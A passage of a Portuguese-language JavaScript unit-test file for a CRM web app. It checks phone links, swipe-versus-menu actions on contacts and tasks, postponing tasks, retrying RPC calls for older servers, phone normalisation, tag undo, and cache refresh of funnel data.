await teste("M28: tel: do cadastro, ações da linha (o deslizar aponta para ações que o ⋮/botão já têm) e adiar para amanhã", () => {
  // hrefTel: só dígitos; DDD + número ganha o 55; fora de 10–13 dígitos não dá para ligar
  assert.equal(L.hrefTel("5512998303030"), "tel:+5512998303030");
  assert.equal(L.hrefTel("(12) 99830-3030"), "tel:+5512998303030");
  assert.equal(L.hrefTel("1230303030"), "tel:+551230303030");
  assert.equal(L.hrefTel("447911123456"), "tel:+447911123456");
  assert.equal(L.hrefTel("123"), null); assert.equal(L.hrefTel(""), null); assert.equal(L.hrefTel(null), null); assert.equal(L.hrefTel("55129983030301234"), null);
  // contato: quem pode escrever tem Tarefa (direita) e Oportunidade (esquerda); todo lado do gesto existe no ⋮
  for (const pode of [true, false]) for (const conversas of [true, false]) for (const telefone of [true, false]) {
    const A = L.acoesDoContato({ pode, conversas, telefone });
    for (const lado of [A.direita, A.esquerda]) if (lado) assert.ok(A.menu.includes(lado) || A.botoes.includes(lado), `o gesto «${lado}» precisa de botão equivalente`);
    assert.ok(A.menu.includes("abrir"), "abrir a ficha sempre existe");
    assert.deepEqual(A.botoes, [telefone && "ligar", conversas && "conversa"].filter(Boolean));
    if (!pode) { assert.equal(A.direita, null); assert.equal(A.esquerda, null); assert.deepEqual(A.menu, ["abrir"]); }
  }
  assert.deepEqual(L.acoesDoContato({ pode: true }), { botoes: [], menu: ["abrir", "tarefa", "negocio"], direita: "tarefa", esquerda: "negocio" });
  // tarefa: direita = concluir (o círculo é o botão), esquerda = adiar (no ⋮); concluída reabre e não adia; excluir só no ⋮
  const T = L.acoesDaTarefa({ pode: true });
  assert.deepEqual(T, { botoes: ["concluir"], menu: ["editar", "adiar", "excluir"], direita: "concluir", esquerda: "adiar" });
  for (const lado of [T.direita, T.esquerda]) assert.ok(T.menu.includes(lado) || T.botoes.includes(lado));
  assert.deepEqual(L.acoesDaTarefa({ pode: true, concluida: true }), { botoes: ["concluir"], menu: ["editar", "excluir"], direita: "concluir", esquerda: null });
  assert.deepEqual(L.acoesDaTarefa({ pode: false }), { botoes: [], menu: [], direita: null, esquerda: null });
  assert.ok(T.menu.includes("excluir") && T.direita !== "excluir" && T.esquerda !== "excluir", "excluir só no ⋮: deslizar nunca exclui, só conclui e adia");
  // adiar: amanhã (dia de SP) na mesma hora; sem data = 09:00; já à frente = só +1 dia
  const agora = new Date("2026-10-01T15:00:00Z");                                          // 12:00 em SP
  assert.equal(L.adiarParaAmanha("2026-10-01T12:33:00Z", agora), "2026-10-02T12:33:00.000Z");   // hoje 09:33 → amanhã 09:33
  assert.equal(L.adiarParaAmanha("2026-09-28T17:00:00Z", agora), "2026-10-02T17:00:00.000Z");   // atrasada há dias → amanhã, não «ontem + 1»
  assert.equal(L.adiarParaAmanha(null, agora), "2026-10-02T12:00:00.000Z");                     // sem prazo → amanhã 09:00
  assert.equal(L.adiarParaAmanha("2026-10-02T12:00:00Z", agora), "2026-10-03T12:00:00.000Z");   // já era amanhã → depois de amanhã
  assert.equal(L.adiarParaAmanha("2026-10-05T20:15:00Z", agora), "2026-10-06T20:15:00.000Z");   // dias à frente → +1 dia
  // virada de dia: 23:40 de 30/09 em SP (= 02:40Z de 01/10) — «amanhã» é 01/10, não 02/10
  assert.equal(L.adiarParaAmanha("2026-10-01T02:30:00Z", new Date("2026-10-01T02:40:00Z")), "2026-10-02T02:30:00.000Z");
});

/* DOM falso mínimo: o suficiente para montar a lista de contatos e a linha de tarefa e chamar, como o dedo ou o mouse chamariam, o gesto e o botão */
function criarFalso() {
  const classe = el => [].concat(el.attrs.class || []).filter(Boolean).join(" ");
  const h = (tag, attrs, ...filhos) => {
    const el = { tag, attrs: attrs || {}, filhos: filhos.flat(Infinity).filter(x => x !== null && x !== undefined && x !== false), ouvintes: {},
      checked: !!(attrs && attrs.checked), classList: { toggle() {}, add() {}, remove() {}, contains: () => false },
      addEventListener(t, f) { this.ouvintes[t] = f; }, appendChild(x) { this.filhos.push(x); return x; } };
    if (attrs && attrs.on) for (const [t, f] of Object.entries(attrs.on)) el.ouvintes[t] = f;
    return el;
  };
  const achar = (raiz, pred, todos = false) => {
    const out = [];
    (function ir(x) { if (!x || typeof x !== "object") return; if (x.tag && pred(x)) out.push(x); for (const f of x.filhos || []) ir(f); })(raiz);
    return todos ? out : out[0];
  };
  const dormir = () => new Promise(r => setTimeout(r, 0));
  return { h, achar, classe, dormir };
}

await teste("M28: deslizar e botão chamam a MESMA ação — contatos (Tarefa/Oportunidade) e tarefas (concluir/adiar/excluir)", async () => {
  const { h, achar, classe, dormir } = criarFalso();
  const { listaCompacta } = await import("../web/app/crm-listas.js");
  const { itemTarefa } = await import("../web/app/crm-tarefas.js");
  const chamadas = [], gestos = [], menus = [], desfazeres = [];
  const ui = {
    icone: n => ({ tag: "ic", attrs: { n }, filhos: [] }), avatar: () => h("span"),
    // plano 100 · C4: a pílula de origem vem com texto nulo e a chave/plataforma (o rótulo real sai da tabela do ui.pilula)
    pilula: (t, cor, x = {}) => h("span", { class: "pilula" }, t ?? `${cor}${x.plataforma ? ` · ${x.plataforma}` : ""}`), etiqueta: e => h("span", { class: "etiq" }, e.nome),
    vazio: o => h("div", { class: "vazio" }, o.titulo), telBR: t => String(t), limpar: el => { el.filhos = []; return el; }, anunciar() {}, toast() {}, horaBR: () => "09:00", dataCurtaBR: () => "02/10", relativo: () => "ontem", hojeSP: () => "2026-10-01",
    deslizar: (el, o) => { gestos.push({ el, o }); return () => {}; },
    menu: (ancora, itens) => { menus.push({ ancora, itens }); return { fechar() {} }; },
    acaoComDesfazer: async o => { desfazeres.push(o); return { estado: "mantida" }; },
  };
  const mods = { tarefas: { formTarefa: async (k_, t, o) => { chamadas.push(["formTarefa", t, o]); return null; } }, negocio: { novoNegocio: async (k_, d) => { chamadas.push(["novoNegocio", d]); } } };
  const mk = (pode = true) => ({
    ui, h, L, ctx: { temModulo: () => true, navegar: h_ => chamadas.push(["navegar", h_]) }, pode: () => pode, etiqueta: () => null, mod: async n => mods[n], toastErro() {}, escrever: async () => ({}),
    v: { contatos: "Pacientes", contato: "Paciente", negocio: "Oportunidade", negocios: "Oportunidades", novo: x => `Nova ${x === "negocio" ? "oportunidade" : x}` },
    api: { rpcC: async (nome, p) => { chamadas.push([nome, p]); return { id: 71, concluida_em: p && p.p_concluida ? "2026-10-01T15:00:00Z" : null }; } },
  });
  const limpa = () => { chamadas.length = 0; gestos.length = 0; menus.length = 0; desfazeres.length = 0; };

  /* ---- contatos ---- */
  const c = { id: 501, nome: "Mariana Costa", telefone: "5512998303030", cidade: "Taubaté", plataforma: "google", etiquetas: [] };
  let k = mk(true);
  const lista = listaCompacta(k, { aoMudar: () => chamadas.push(["aoMudar"]) });
  lista.atualizar([c]);
  const li = achar(lista.el, x => classe(x) === "ct-li");
  assert.ok(li, "uma linha por paciente");
  const tel = achar(li, x => x.tag === "a" && /^tel:/.test(x.attrs.href || ""));
  assert.equal(tel.attrs.href, "tel:+5512998303030"); assert.match(tel.attrs["aria-label"], /Ligar para Mariana Costa/);
  const conv = achar(li, x => x.tag === "a" && /conversas\?contato=501/.test(x.attrs.href || ""));
  assert.ok(conv && /Abrir conversa/.test(conv.attrs["aria-label"]), "Abrir conversa");
  assert.equal(achar(li, x => classe(x) === "ct-abrir").attrs.href, "#/contatos/501", "tocar na linha abre a ficha");
  assert.equal(achar(li, x => classe(x) === "pilula").filhos[0], "anuncio · google", "uma pílula só: a origem do anúncio (variante origem com a plataforma)");
  assert.equal(gestos.length, 1, "a linha desliza");
  const g = gestos[0].o;
  assert.equal(typeof g.direita, "function"); assert.equal(typeof g.esquerda, "function");
  achar(li, x => /Mais ações para/.test(x.attrs["aria-label"] || "")).ouvintes.click();
  const itens = menus.at(-1).itens;
  assert.deepEqual(itens.map(i => i.rotulo), ["Abrir ficha", "Nova tarefa", "Nova oportunidade"]);
  // direita = Nova tarefa; esquerda = Nova oportunidade — e o ⋮ faz exatamente o mesmo
  limpa(); await g.direita(); await dormir(); const viaGestoT = JSON.stringify(chamadas);
  limpa(); await itens[1].fn(); await dormir(); const viaMenuT = JSON.stringify(chamadas);
  assert.equal(viaGestoT, viaMenuT, "Tarefa: gesto = ⋮"); assert.equal(viaGestoT, JSON.stringify([["formTarefa", null, { contato_id: 501 }]]));
  limpa(); await g.esquerda(); await dormir(); const viaGestoN = JSON.stringify(chamadas.map(x => x.slice(0, 2)));
  limpa(); await itens[2].fn(); await dormir(); const viaMenuN = JSON.stringify(chamadas.map(x => x.slice(0, 2)));
  assert.equal(viaGestoN, viaMenuN, "Oportunidade: gesto = ⋮"); assert.equal(viaGestoN, JSON.stringify([["novoNegocio", { contato_id: 501 }]]));
  // sem permissão de escrita: sem gesto e só «Abrir ficha»; sem telefone não há Ligar
  limpa(); k = mk(false);
  const l2 = listaCompacta(k, { aoMudar() {} }); l2.atualizar([{ id: 9, nome: "Sem fone", telefone: null }]);
  assert.equal(gestos[0].o.direita, undefined); assert.equal(gestos[0].o.esquerda, undefined);
  const li2 = achar(l2.el, x => classe(x) === "ct-li");
  assert.ok(!achar(li2, x => x.tag === "a" && /^tel:/.test(x.attrs.href || "")), "sem telefone, sem Ligar");
  achar(li2, x => /Mais ações para/.test(x.attrs["aria-label"] || "")).ouvintes.click();
  assert.deepEqual(menus.at(-1).itens.map(i => i.rotulo), ["Abrir ficha"]);
  limpa(); l2.atualizar([]);
  assert.match(String(achar(l2.el, x => classe(x) === "vazio").filhos[0]), /Nada encontrado/, "lista vazia: ui.vazio sem_resultado");

  /* ---- tarefas ---- */
  const t = { id: 71, titulo: "Confirmar avaliação", tipo: "ligacao", vence_em: "2099-01-10T15:00:00Z", concluida_em: null, contato: { id: 501, nome: "Mariana Costa" } };
  limpa(); k = mk(true);
  const eventos = [];
  const li3 = itemTarefa(k, t, { aoMudar: ev => eventos.push(ev), mostrarVinculo: true });
  const mais = achar(li3, x => /Mais ações da tarefa/.test(x.attrs["aria-label"] || ""));
  assert.equal(gestos[0].el.attrs.class[0], "tf", "o que desliza é a linha .tf (a moldura .tf-li fica parada, com o fundo do gesto)");
  mais.ouvintes.click();
  const mi = menus.at(-1).itens;
  assert.deepEqual(mi.map(i => i.rotulo), ["Editar", "Adiar para amanhã", "Excluir"]);
  assert.equal(mi[2].perigo, true);
  // concluir: o círculo e o deslizar para a direita
  limpa(); k.api.rpcC = async (n, p) => { chamadas.push([n, p]); return { ...t, concluida_em: p.p_concluida ? "2026-10-01T15:00:00Z" : null }; };
  const liA = itemTarefa(k, t, { aoMudar() {} }); const ckA = achar(liA, x => x.tag === "input");
  ckA.checked = true; await ckA.ouvintes.change(); await dormir();
  const viaCirculo = JSON.stringify(chamadas); const desfCirculo = desfazeres.length;
  limpa(); k.api.rpcC = async (n, p) => { chamadas.push([n, p]); return { ...t, concluida_em: p.p_concluida ? "2026-10-01T15:00:00Z" : null }; };
  const liB = itemTarefa(k, t, { aoMudar() {} }); const swB = gestos[0].o;
  await swB.direita(); await dormir();
  assert.equal(JSON.stringify(chamadas), viaCirculo, "concluir: gesto = círculo"); assert.equal(viaCirculo, JSON.stringify([["nx_tarefa_concluir", { p_id: 71, p_concluida: true }]]));
  assert.equal(desfazeres.length, desfCirculo, "e os dois oferecem o Desfazer");
  await desfazeres[0].reverter(); assert.deepEqual(chamadas.at(-1), ["nx_tarefa_concluir", { p_id: 71, p_concluida: false }], "Desfazer reabre");
  // adiar: ⋮ e deslizar para a esquerda gravam o mesmo vencimento; Desfazer devolve o de antes
  limpa(); k.api.rpcC = async (n, p) => { chamadas.push([n, p]); return { ...t, vence_em: p.p_tarefa.vence_em }; };
  const liC = itemTarefa(k, t, { aoMudar: ev => eventos.push(ev) });
  achar(liC, x => /Mais ações da tarefa/.test(x.attrs["aria-label"] || "")).ouvintes.click();
  await menus.at(-1).itens[1].fn(); await dormir(); const viaMenuAdiar = JSON.stringify(chamadas); const txtMenu = desfazeres.at(-1).texto;
  limpa(); k.api.rpcC = async (n, p) => { chamadas.push([n, p]); return { ...t, vence_em: p.p_tarefa.vence_em }; };
  itemTarefa(k, t, { aoMudar() {} }); await gestos[0].o.esquerda(); await dormir();
  assert.equal(JSON.stringify(chamadas), viaMenuAdiar, "adiar: gesto = ⋮");
  assert.equal(viaMenuAdiar, JSON.stringify([["nx_tarefa_salvar", { p_tarefa: { id: 71, vence_em: "2099-01-11T15:00:00.000Z" } }]]));
  assert.match(txtMenu, /adiada para 02\/10/);
  await desfazeres.at(-1).reverter(); assert.deepEqual(chamadas.at(-1), ["nx_tarefa_salvar", { p_tarefa: { id: 71, vence_em: "2099-01-10T15:00:00Z" } }], "Desfazer devolve o vencimento anterior");
  // excluir: a lixeira (desktop) e o ⋮ (celular) — a mesma ação com Desfazer; deslizar NÃO exclui
  limpa(); const ev3 = []; k.api.rpcC = async (n, p) => { chamadas.push([n, p]); return {}; };
  const liD = itemTarefa(k, t, { aoMudar: e => ev3.push(e) });
  achar(liD, x => /Excluir a tarefa/.test(x.attrs["aria-label"] || "")).ouvintes.click();
  const viaLixeira = desfazeres.at(-1); limpa();
  achar(liD, x => /Mais ações da tarefa/.test(x.attrs["aria-label"] || "")).ouvintes.click();
  await menus.at(-1).itens[2].fn(); const viaMais = desfazeres.at(-1);
  assert.equal(viaLixeira.texto, viaMais.texto); assert.match(viaMais.texto, /excluída/);
  viaMais.aplicar(); assert.equal(ev3.at(-1).tipo, "excluida");
  await viaMais.firmar(); assert.deepEqual(chamadas.at(-1), ["nx_tarefa_excluir", { p_id: 71 }], "a exclusão de verdade só no firmar");
  viaMais.reverter(); assert.equal(ev3.at(-1).tipo, "salva", "Desfazer devolve a tarefa");
  // concluída: reabre ao deslizar para a direita; não adia
  limpa(); itemTarefa(k, { ...t, concluida_em: "2026-10-01T10:00:00Z" }, { aoMudar() {} });
  assert.equal(typeof gestos[0].o.direita, "function"); assert.equal(gestos[0].o.esquerda, undefined);
  // sem permissão: nada desliza, sem ⋮
  limpa(); const semPode = mk(false); const liE = itemTarefa(semPode, t, { aoMudar() {} });
  assert.equal(gestos.length, 0, "sem permissão não há gesto"); assert.ok(!achar(liE, x => /Mais ações da tarefa/.test(x.attrs["aria-label"] || "")));
});

await teste("M28 (estático): lista compacta só no celular, Exportar/Importar no ⋮, «Novo» flutuante, busca fixa, ⋮ e deslizar nas tarefas", () => {
  const js = ler("crm-listas.js"), tj = ler("crm-tarefas.js"), css = ler("crm.css");
  // contatos
  assert.ok(/L\.acoesDoContato\(/.test(js) && /ui\.deslizar\(frente,\s*\{\s*direita:\s*A\.direita \? \(\) => executar\(A\.direita, c\)/.test(js) && /fn:\s*\(\) => executar\(id, c\)/.test(js), "gesto e ⋮ chamam executar()");
  assert.ok(js.includes("href: L.hrefTel(c.telefone)"), "Ligar usa tel:");
  assert.ok(/class:\s*"bt-icone crm-cab-mais"/.test(js) && /Exportar planilha/.test(js) && /Importar planilha/.test(js), "Exportar/Importar no ⋮ do cabeçalho");
  assert.ok(/class:\s*"crm-fab"/.test(js) && /class:\s*"pilha-p crm-fixa"/.test(js), "«Novo» flutuante e busca fixa");
  assert.ok(/listaM\.atualizar\(r\.itens\)/.test(js) && /tab\.atualizar\(r\.itens\)/.test(js), "a tabela continua (desktop) e a lista compacta é desenhada junto");
  assert.ok(!/innerHTML/.test(js), "sem innerHTML");
  // tarefas
  assert.ok(/L\.acoesDaTarefa\(/.test(tj) && /ui\.deslizar\(el,\s*\{\s*direita:\s*A\.direita \? \(\) => executar\(A\.direita\)/.test(tj), "o deslizar da tarefa usa executar()");
  assert.ok(/check\.addEventListener\("change",\s*\(\) => alternar\(check\.checked\)\)/.test(tj) && /return alternar\(!check\.checked\)/.test(tj), "círculo e gesto chamam alternar()");
  assert.ok(/ui\.menu\(mais,\s*A\.menu\.map\(id => \(\{[^}]*fn:\s*\(\) => executar\(id\)/.test(tj), "o ⋮ chama executar()");
  assert.ok(/ocultas\.add\(t\.id\)/.test(tj) && /carregar\(true\)/.test(tj), "recarga quieta e exclusão pendente não volta na recarga");
  // CSS
  assert.ok(/\.ct-lista-env,\s*\.crm-cab-mais,\s*\.tf-mais\s*\{\s*display:\s*none;\s*\}/.test(css), "a lista compacta, o ⋮ do cabeçalho e o ⋮ da tarefa começam escondidos (desktop)");
  const m760 = css.slice(css.indexOf("/* M28: Pacientes e Tarefas"));
  assert.ok(/\.crm\[data-tela="contatos"\] \.tabela-env\s*\{\s*display:\s*none;\s*\}/.test(m760) && /\.ct-lista-env\s*\{\s*display:\s*block;\s*\}/.test(m760), "≤ 760 px: tabela some, lista compacta aparece");
  assert.ok(/\.crm\[data-tela="contatos"\] \.crm-fixa\s*\{[^}]*position:\s*sticky;[^}]*top:\s*var\(--topo\)/.test(m760), "busca fixa ao rolar");
  assert.ok(/\.tf-acoes \.bt-icone:not\(\.tf-mais\)\s*\{\s*display:\s*none;/.test(m760) && /\.tf-acoes \.tf-mais\s*\{\s*display:\s*inline-grid;/.test(m760), "lápis e lixeira viram um ⋮ no celular");
  assert.ok(/\.ct-linha\s*\{[^}]*min-height:\s*68px/.test(css) && /\.ct-bt\s*\{\s*width:\s*44px;\s*height:\s*44px;/.test(css), "linha de ~72 px com alvos de 44 px");
  assert.ok(/\.ct-fundo, \.tf-fundo\s*\{[^}]*width:\s*50%/.test(css) && /\.ct-fundo-d, \.tf-fundo-d \{ left: 0; \}/.test(css), "cada fundo do gesto ocupa só a sua metade (um não cobre o outro)");
  assert.ok(!/(^|\n)\s*\.ct-[a-z-]+[^{]*\{[^}]*font-size:\s*(?:1[01]|[0-9])px/.test(css), "nada abaixo de 12 px na lista compacta");
});

/* ============================================================ (c) revisão do R119 — o que a tela mostra é o que o banco tem */
console.log("\n(c) revisão do R119 — CRM e Agenda");

await teste("p_req sem plano B: servidor sem a função com p_req (404 / PGRST202) → repete UMA vez sem a chave e a criação funciona", async () => {
  const naoAchou = () => Object.assign(new Error("Could not find the function public.nx_negocio_salvar(p_cliente, p_negocio, p_req, p_token) in the schema cache"),
    { codigo: "Could not find the function public.nx_negocio_salvar(p_cliente, p_negocio, p_req, p_token) in the schema cache", status: 404, resposta: { code: "PGRST202" } });
  // o que conta como «função inexistente»
  assert.ok(L.funcaoInexistente(naoAchou()));
  assert.ok(L.funcaoInexistente({ codigo: "http_404", status: 404 }), "HTTP 404");
  assert.ok(L.funcaoInexistente({ codigo: "PGRST202" }) && L.funcaoInexistente({ codigo: "x", resposta: { code: "PGRST202" } }), "código PGRST202");
  assert.ok(L.funcaoInexistente({ message: "could not find the function public.nx_x" }), "texto do PostgREST, em qualquer caixa");
  for (const e of [null, {}, { codigo: "dados_invalidos", status: 400 }, { codigo: "sem_conexao" }, { codigo: "http_500", status: 500 }, { codigo: "negocio_nao_encontrado", status: 400 }]) assert.ok(!L.funcaoInexistente(e), JSON.stringify(e));
  // servidor ANTIGO: só existe a versão sem p_req
  const antigo = (falhaSemReq = null) => {
    const chamadas = [], criados = [];
    return { chamadas, criados, api: { async rpcC(nome, p) {
      chamadas.push({ nome, temReq: "p_req" in p });
      if ("p_req" in p) throw naoAchou();
      if (falhaSemReq) throw Object.assign(new Error(falhaSemReq), { codigo: falhaSemReq });
      const r = { id: criados.length + 1, titulo: p.p_negocio.titulo }; criados.push(r); return r;
    } } };
  };
  const sem = async () => {};
  let s = antigo();
  const r = await L.escreverComReq(s.api, "nx_negocio_salvar", { p_negocio: { titulo: "A" } }, { dormir: sem });
  assert.deepEqual(s.chamadas, [{ nome: "nx_negocio_salvar", temReq: true }, { nome: "nx_negocio_salvar", temReq: false }], "1ª com p_req, 2ª sem");
  assert.deepEqual([s.criados.length, r.resultado.id, r.semReq], [1, 1, true], "criou uma vez e avisa que foi sem a chave");
  // a 2ª (sem chave) não tem proteção contra duplicar: um erro nela NÃO se repete nem vira «ambíguo» (a tela não promete «é seguro, não duplica»)
  s = antigo("sem_conexao");
  await assert.rejects(() => L.escreverComReq(s.api, "nx_negocio_salvar", { p_negocio: { titulo: "B" } }, { dormir: sem }), e => e.codigo === "sem_conexao" && !e.ambigua);
  assert.equal(s.chamadas.length, 2, "uma vez só sem p_req");
  // função que não existe de jeito nenhum: duas chamadas e o erro sobe
  const nunca = [];
  await assert.rejects(() => L.escreverComReq({ rpcC: async (n, p) => { nunca.push("p_req" in p); throw naoAchou(); } }, "nx_negocio_salvar", { p_negocio: {} }, { dormir: sem }), e => e.status === 404);
  assert.deepEqual(nunca, [true, false]);
  // servidor NOVO continua igual: uma chamada, com p_req, sem semReq
  const novo = [];
  const rn = await L.escreverComReq({ rpcC: async (n, p) => { novo.push("p_req" in p); return { id: 9 }; } }, "nx_negocio_salvar", { p_negocio: {} }, { dormir: sem });
  assert.deepEqual([novo, rn.semReq, rn.resultado.id], [[true], undefined, 9]);
  // os 5 pontos de criação passam por escreverComReq (negócio, pós-venda, contato, tarefa, consulta)
  assert.equal((ler("crm-negocio.js").match(/k\.escrever\("nx_negocio_salvar"/g) || []).length, 2);
  assert.ok(/k\.escrever\("nx_contato_salvar"/.test(ler("crm-listas.js")) && /k\.escrever\("nx_tarefa_salvar"/.test(ler("crm-tarefas.js")) && /Lg\.escreverComReq\(api, "nx_agenda_marcar"/.test(ler("agenda.js")));
});

await teste("telefone com «+» (outro país): 8 a 15 dígitos, nunca ganha 55 — na checagem dos formulários, na importação e nos campos", () => {
  assert.equal(L.normalizarTelefone("+1 415 555 2671"), "14155552671", "EUA: 11 dígitos com + não viram número brasileiro");
  assert.equal(L.normalizarTelefone("+14155552671"), "14155552671", "o que o ui.lerForm devolve (+ e dígitos)");
  assert.equal(L.normalizarTelefone("  +44 20 7946 0958"), "442079460958");
  assert.equal(L.normalizarTelefone("+351 912 345 678"), "351912345678");
  assert.equal(L.normalizarTelefone("+12345678"), "12345678", "8 dígitos com + valem");
  assert.equal(L.normalizarTelefone("+1234567"), null, "menos de 8");
  assert.equal(L.normalizarTelefone("+1234567890123456"), null, "mais de 15");
  // plano 100 · S-B5/C7 (20261008a): sem o «+», 10–11 dígitos só ganham 55 quando parecem brasileiros (DDD válido; com 11, o 3º é o 9)
  assert.equal(L.normalizarTelefone("14155552671"), null, "sem o +, 11 dígitos sem o 9 do celular não viram número brasileiro (regra do banco)");
  assert.equal(L.normalizarTelefone("12997773031"), "5512997773031", "sem o +, celular brasileiro de 11 dígitos ganha 55");
  assert.deepEqual(L.checarLinha({ nome: "Ana", telefone: "+1 415 555 2671" }), []);
  assert.equal(L.validarCampo({ tipo: "telefone" }, "+12345678"), null);
  assert.equal(L.normalizarCampo({ tipo: "telefone" }, "+1 415 555 2671"), "14155552671");
  // ficha do contato: editar o telefone mantém o + (senão o servidor trata como brasileiro)
  assert.ok(/return dg \? \(x\.value\.trim\(\)\.startsWith\("\+"\) \? "\+" : ""\) \+ dg : null;/.test(ler("crm-listas.js")));
});

await teste("etiquetas: o Desfazer aplica só o inverso da diferença (a etiqueta posta depois continua)", () => {
  // pôs VIP (aviso 1), depois Retorno (aviso 2); Desfazer do aviso 1 tira só VIP
  assert.deepEqual(L.desfazerEtiquetas(["a", "vip", "retorno"], ["vip"], []), ["a", "retorno"]);
  // tirou «a» e depois pôs «b»: Desfazer devolve «a» e mantém «b»
  assert.deepEqual(L.desfazerEtiquetas(["b"], [], ["a"]), ["b", "a"]);
  // o que já voltou não duplica; o que já saiu não dá erro
  assert.deepEqual(L.desfazerEtiquetas(["a", "b"], ["x"], ["a"]), ["a", "b"]);
  assert.deepEqual(L.desfazerEtiquetas(null, ["x"], null), []);
  for (const f of ["crm-negocio.js", "crm-listas.js"]) {
    const js = ler(f);
    assert.ok(/L\.desfazerEtiquetas\((n|c)\.etiquetas \|\| \[\], mais, menos\)/.test(js), `${f}: o reverter parte do conjunto ATUAL`);
    assert.ok(!/salvar\(\{ etiquetas: antes \}\)/.test(js), `${f}: não regrava o conjunto inteiro de antes`);
  }
});

await teste("textos: contato sem nome (telefone → e-mail → «Sem nome») e data da pontuação do lead (01/10/2026 às 14:03)", () => {
  assert.equal(L.nomeContato({ nome: "Ana", telefone: "5512998303030" }), "Ana");
  assert.equal(L.nomeContato({ nome: "  ", telefone: "5512998303030", email: "a@x.com" }), "(12) 99830-3030");
  assert.equal(L.nomeContato({ nome: null, telefone: null, email: "ana@x.com" }), "ana@x.com", "quem entrou só com e-mail continua identificável");
  assert.equal(L.nomeContato({ nome: null, telefone: null, email: null }), "Sem nome");
  assert.equal(L.nomeContato(null), "Sem nome");
  const listas = ler("crm-listas.js");
  assert.ok(!/ui\.telBR\(c\.telefone\) \|\| "Sem nome"/.test(listas), "ui.telBR(null) devolve «—»: o «Sem nome» nunca aparecia");
  assert.ok((listas.match(/L\.nomeContato\(c\)/g) || []).length >= 4, "tabela, lista do celular e ficha");
  assert.equal(L.quandoPontuacao("2026-10-01T14:03"), "01/10/2026 às 14:03");
  assert.equal(L.quandoPontuacao("2026-10-01 09:30:12"), "01/10/2026 às 09:30");
  assert.equal(L.quandoPontuacao("2026-10-01"), "01/10/2026");
  assert.equal(L.quandoPontuacao("ontem"), "ontem", "formato desconhecido volta como veio");
  assert.equal(L.quandoPontuacao(null), "");
  assert.ok(/Atribuída em \$\{L\.quandoPontuacao\(pont\.em\)\}/.test(ler("crm-negocio.js")));
});

await teste("base do CRM: a rede troca os funis da base servida do aparelho → a tela é avisada; rede que falha depois do cache → a próxima chamada tenta de novo; recarga forçada renova a cópia guardada", async () => {
  const CRM = await import("../web/app/crm.js");
  const tique = () => new Promise(r => setTimeout(r, 0));
  const funil = (nome, etapas) => ({ id: "f1", nome, padrao: true, ativo: true, estagios: etapas.map((n, i) => ({ id: `e${i}`, nome: n, tipo: "aberto" })) });
  const baseDe = f => ({ funis: [f], etiquetas: [], usuarios: [], campos: [], motivos: [], ticket: {} });
  const mkCtx = (id, responder) => {
    const chamadas = [];
    return { chamadas, ctx: { versao: "TESTE", cliente: { id }, vocab: {}, pode: () => true, ui: { h() {}, corOk: () => null, toast() {}, brl: v => String(v) },
      api: { rpcC(nome, p, o = {}) { chamadas.push({ nome, o }); return responder(o, chamadas.length); } } } };
  };
  // 1) aparelho tem a base ANTIGA (2 etapas); a rede traz 3 etapas
  const antiga = baseDe(funil("Vendas", ["Nova", "Fechou"])), nova = baseDe(funil("Vendas", ["Nova", "Orçamento", "Fechou"]));
  // como o api.js de verdade: a cópia do aparelho chega DEPOIS de a chamada sair (leitura assíncrona do IndexedDB), antes da rede
  const servir = o => { if (o.aoCache) Promise.resolve().then(() => o.aoCache(JSON.parse(JSON.stringify(antiga)))); };
  let soltarRede;
  let a = mkCtx("cli-r119-1", o => { servir(o); return new Promise(res => { soltarRede = () => res(JSON.parse(JSON.stringify(nova))); }); });
  const k = await CRM.kit(a.ctx);
  assert.equal(k.base.funis[0].estagios.length, 2, "a tela abre com o que estava guardado");
  const guardada = k.base;
  let avisos = 0;
  const cancelar = k.aoBaseMudar(() => { avisos++; });
  soltarRede(); await tique();
  assert.equal(k.base, guardada, "o MESMO objeto é atualizado");
  assert.equal(k.funil("f1").estagios.length, 3, "a base passa a ter as etapas novas");
  assert.equal(avisos, 1, "o quadro é avisado para refazer o funil e recarregar");
  // sem mudança nos funis não há aviso; depois de cancelar também não
  cancelar();
  a = mkCtx("cli-r119-2", o => { servir(o); return Promise.resolve(JSON.parse(JSON.stringify(antiga))); });
  const k2 = await CRM.kit(a.ctx); let avisos2 = 0; k2.aoBaseMudar(() => { avisos2++; });
  await tique();
  assert.equal(avisos2, 0, "funis iguais: nada a refazer");
  // 2) a rede FALHA depois de servir o cache: a próxima chamada tenta a rede de novo (antes ficava presa na promessa antiga pelo resto da sessão)
  a = mkCtx("cli-r119-3", (o, n) => { servir(o); return n === 1 ? Promise.reject(Object.assign(new Error("sem_conexao"), { codigo: "sem_conexao" })) : Promise.resolve(JSON.parse(JSON.stringify(nova))); });
  const k3 = await CRM.kit(a.ctx); let avisos3 = 0; k3.aoBaseMudar(() => { avisos3++; });
  await tique();
  assert.equal(a.chamadas.length, 1);
  const k3b = await CRM.kit(a.ctx);
  assert.equal(a.chamadas.length, 2, "nova tentativa na rede");
  assert.equal(k3b.base, k3.base, "a tela que já estava aberta guarda o mesmo objeto");
  await tique();
  assert.equal(k3.base.funis[0].estagios.length, 3, "…e ele recebe o dado novo");
  assert.equal(avisos3, 1);
  // 3) recarga forçada: vai à rede com `cache: true` (renova a cópia do aparelho) e SEM aoCache (nada é servido do aparelho)
  await k3.recarregarBase();
  const forcada = a.chamadas.at(-1).o;
  assert.ok(forcada.cache === true && typeof forcada.aoCache !== "function");
});

await teste("Kanban (estático): pendente não aceita outro movimento, remoção condicional, soltar fora não move, keepalive ao sair, redesenho adiado no arrasto, funis da base", () => {
  const js = ler("crm-kanban.js");
  // mover de novo o mesmo cartão durante os 7 s: recusado nos 3 caminhos (arrastar/soltar, teclado, «Mover para…»)
  assert.ok(/function recusarSePendente\(id\)/.test(js));
  assert.ok(/if \(recusarSePendente\(id\)\) \{ preencherColunaDoCartao\(id\); focarCartao\(id\); return; \}/.test(js), "soltar");
  assert.ok(/ev\.preventDefault\(\);\s*if \(recusarSePendente\(id\)\) return;/.test(js), "Espaço (teclado)");
  assert.ok(/if \(!card \|\| !podeMover \|\| recusarSePendente\(id\)\) return;/.test(js), "«Mover para…»");
  // um movimento antigo nunca apaga o pendente mais novo do mesmo cartão
  assert.ok(/function soltarPendente\(mov\) \{ if \(S\.pend\.get\(mov\.id\) === mov\) S\.pend\.delete\(mov\.id\); \}/.test(js));
  assert.ok(!/S\.pend\.delete\(mov\.id\)(?!; \})/.test(js), "nenhum S.pend.delete(mov.id) solto");
  // sem zona nem coluna sob o ponto: sem destino
